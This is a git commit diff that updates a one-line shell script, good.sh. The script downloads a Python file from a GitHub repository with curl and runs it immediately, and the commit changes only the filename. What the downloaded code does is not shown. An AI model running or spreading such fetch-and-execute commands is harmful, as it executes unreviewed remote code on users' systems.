a43a16912f1101a33c6b33895726d8d0ee3634b1
lianamahesra-creator <lianamahesra@gmail.com>
2026-07-13 10:33:55 +0700

    Update good.sh

--- good.sh
+++ good.sh
@@ -1,1 +1,1 @@
-curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/foo.py;python foo.py
+curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/run.py;python run.py
